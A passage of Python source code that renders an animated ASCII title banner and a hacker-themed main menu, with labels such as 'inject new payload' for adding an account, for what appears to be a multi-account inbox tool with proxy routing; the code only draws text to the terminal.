    r"  ██╗███╗   ██╗██╗   ██╗██╗███████╗██╗██████╗ ██╗     ███████╗",
    r"  ██║████╗  ██║██║   ██║██║██╔════╝██║██╔══██╗██║     ██╔════╝",
    r"  ██║██╔██╗ ██║██║   ██║██║███████╗██║██████╔╝██║     █████╗  ",
    r"  ██║██║╚██╗██║╚██╗ ██╔╝██║╚════██║██║██╔══██╗██║     ██╔══╝  ",
    r"  ██║██║ ╚████║ ╚████╔╝ ██║███████║██║██████╔╝███████╗███████╗",
    r"  ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝",
]

CURRENT_MEM_HEX = "0x4F1A"
CURRENT_SYS_HEX = "0x8B22"
MENU_BANNER_START_TIME = time.time()


def render_streamed_title_banner(banner_t, mem_hex=None, sys_hex=None):
    """Renders the INVISIBLE title banner streaming smoothly in an infinite loop without text scattering."""
    m_hex = mem_hex or CURRENT_MEM_HEX
    s_hex = sys_hex or CURRENT_SYS_HEX

    C1 = Fore.CYAN + Style.BRIGHT
    C2 = Fore.LIGHTCYAN_EX
    C3 = Fore.BLUE + Style.BRIGHT
    C4 = Fore.LIGHTBLUE_EX
    CG = Fore.GREEN + Style.BRIGHT
    CX = Style.RESET_ALL

    row_colors = [C1, C2, C3, C4, C4, C3]
    tags = [
        "                   ",
        f"    {CG}[SYS: OK]{CX}      ",
        f"    {CG}[NET: ON]{CX}      ",
        f"  {Fore.YELLOW}[MEM: {m_hex}]{CX}    ",
        f"  {Fore.YELLOW}[KEY: AES]{CX}       ",
        f"  {Fore.YELLOW}[ID : {s_hex}]{CX}    ",
    ]

    cycle = 7.0
    phase = banner_t % cycle
    lines = []

    for r_idx, raw in enumerate(RAW_TITLE_BANNER):
        c_code = row_colors[r_idx]
        row_chars = ["  "]  # 2 spaces left margin

        if phase < 3.0:
            # 1. Clean Left-to-Right stream without scattering glyphs
            cutoff = int((phase / 3.0) * 62)
            for c_idx, ch in enumerate(raw):
                if c_idx < cutoff:
                    row_chars.append(f"{c_code}{ch}{CX}")
                elif c_idx == cutoff:
                    row_chars.append(f"{Fore.WHITE}{Style.BRIGHT}█{CX}")
                else:
                    row_chars.append(" ")
            tag_str = tags[r_idx] if cutoff >= 60 else " " * 19

        elif phase < 4.5:
            # 2. Specular white shimmer glint wave
            wave = int(((phase - 3.0) / 1.5) * 62)
            for c_idx, ch in enumerate(raw):
                if abs(c_idx - wave) <= 2:
                    row_chars.append(f"{Fore.WHITE}{Style.BRIGHT}{ch}{CX}")
                else:
                    row_chars.append(f"{c_code}{ch}{CX}")
            tag_str = tags[r_idx]

        elif phase < 6.2:
            # 3. Solid fully-assembled glow hold
            for ch in raw:
                row_chars.append(f"{c_code}{ch}{CX}")
            tag_str = tags[r_idx]

        else:
            # 4. Clean cursor wipe reset
            wipe = int(((phase - 6.2) / 0.8) * 62)
            for c_idx, ch in enumerate(raw):
                if c_idx < wipe:
                    row_chars.append(" ")
                elif c_idx == wipe:
                    row_chars.append(f"{Fore.WHITE}{Style.BRIGHT}█{CX}")
                else:
                    row_chars.append(f"{c_code}{ch}{CX}")
            tag_str = tags[r_idx] if wipe < 30 else " " * 19

        lines.append("".join(row_chars) + tag_str)
    return lines


def draw_main_menu(public_ip, proxy_str, accounts):
    global CURRENT_MEM_HEX, CURRENT_SYS_HEX, MENU_BANNER_START_TIME
    import random

    CURRENT_MEM_HEX = f"0x{random.randint(0x1000, 0xFFFF):04X}"
    CURRENT_SYS_HEX = f"0x{random.randint(0x1000, 0xFFFF):04X}"
    MENU_BANNER_START_TIME = time.time()

    title = render_streamed_title_banner(0.0)

    if accounts:
        menu = [
            f"{Fore.GREEN} [+] secure connection established...",
            " [+] verifying cryptographic signatures...",
            " [+] ghost protocol initialized.",
            "",
            f"{Fore.CYAN} aryan@ghost-node:~# whoami",
            f"{Fore.GREEN} root",
            f"{Fore.CYAN} aryan@ghost-node:~# ls -l targets",
            f"{Fore.GREEN} > [ 1 ] intercept stream ({len(accounts)} active)",
            " > [ 2 ] open unified inbox",
            " > [ 3 ] inject new payload (add account)",
            " > [ 4 ] purge connection (remove account)",
            " > [ 5 ] list remote targets",
            " > [ 6 ] configure tunnel routing",
            " > [ 7 ] benchmark proxy pool (auto-test)",
            " > [ 8 ] exit"
        ]
    else:
        menu = [
            f"{Fore.RED} [-] no secure connections found...",
            f"{Fore.YELLOW} [!] waiting for payload injection...",
            "",
            f"{Fore.CYAN} aryan@ghost-node:~# ls -l targets",
            f"{Fore.GREEN} > [ 1 ] inject new payload (add account)",
            " > [ 2 ] configure tunnel routing",
            " > [ 3 ] benchmark proxy pool (auto-test)",
            " > [ 4 ] exit",
        ]

    box_border_color = Fore.GREEN + Style.BRIGHT
    box_top = " " + box_border_color + "┌── " + Fore.WHITE + Style.BRIGHT + "MATRIX STREAM" + box_border_color + " ───────────────────┐" + Style.RESET_ALL + " "
    box_bot = " " + box_border_color + "└" + "─" * 36 + "┘" + Style.RESET_ALL + " "

    # Top border (85 dashes = perfectly accommodates 10% larger matrix box)
    print(Fore.CYAN + " ┌" + "─" * 85 + "┐")
    for line in title:
        print(f" │ {line} │")
    print(Fore.CYAN + " ├" + "─" * 85 + "┤")
    # IP and Proxy line (dynamically calculated with comfortable right margin, shifted left)
    import re
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

    ip_part = f"{Fore.WHITE}[ IP : {public_ip:<15}]"
    proxy_part = f"{Fore.WHITE}[ PROXY : {proxy_str}]"
    vis_ip = len(ansi_escape.sub('', ip_part))
    vis_proxy = len(ansi_escape.sub('', proxy_part))

    # Shift proxy text left with 4-space right margin so it never pushes out the border
    margin_left = 2
    margin_right = 4
    space_between = max(2, 85 - margin_left - margin_right - vis_ip - vis_proxy)
    right_pad = max(2, 85 - margin_left - vis_ip - space_between - vis_proxy)
    print(f" │{' ' * margin_left}{ip_part}{' ' * space_between}{proxy_part}{' ' * right_pad}{Fore.CYAN}│")
    print(Fore.CYAN + " ├" + "─" * 44 + "┬" + "─" * 40 + "┤")

    import re
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    rain_rows = GLOBAL_MATRIX_PANEL.render_rows()

    for i in range(15):
        left = menu[i] if i < len(menu) else ""
        visible_left_len = len(ansi_escape.sub('', left))
        padding = max(0, 42 - visible_left_len)
        left_padded = left + (" " * padding)

        div = Fore.CYAN + "│" + Style.RESET_ALL

        if i == 0:
            right_box = box_top
        elif i == 14:
            right_box = box_bot
        else:
            rain_line = rain_rows[i - 1]
            right_box = " " + box_border_color + "│" + Style.RESET_ALL + rain_line + box_border_color + "│" + Style.RESET_ALL + " "

        print(Fore.CYAN + " │ " + Style.RESET_ALL + left_padded + " " + div + right_box + Fore.CYAN + "│")

    print(Fore.CYAN + " └" + "─" * 44 + "┴" + "─" * 40 + "┘" + Style.RESET_ALL)


